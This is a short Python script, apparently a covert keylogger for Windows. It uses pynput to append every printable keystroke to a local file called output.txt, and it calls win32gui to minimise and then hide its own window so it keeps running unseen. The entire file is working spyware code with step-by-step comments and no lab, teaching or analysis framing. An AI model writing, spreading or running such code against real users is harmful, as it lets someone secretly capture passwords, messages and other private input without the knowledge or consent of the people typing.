import os
import win32gui
from pynput import keyboard


# Function to handle keyboard events
def on_press(key):
    try:
        # Open output file to append new keystrokes
        with open('output.txt', 'a') as f:
            # Write key to output file
            f.write(str(key.char))
    except AttributeError:
        # Handle special keys (like shift or ctrl) that do not have a printable representation
        pass

# Create a listener object and start listening for events
with keyboard.Listener(on_press=on_press) as listener:
    # Hide the program window
    win = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(win, 6)  # SW_MINIMIZE
    win32gui.ShowWindow(win, 0)  # SW_HIDE
    # Keep the program running indefinitely
    listener.join()
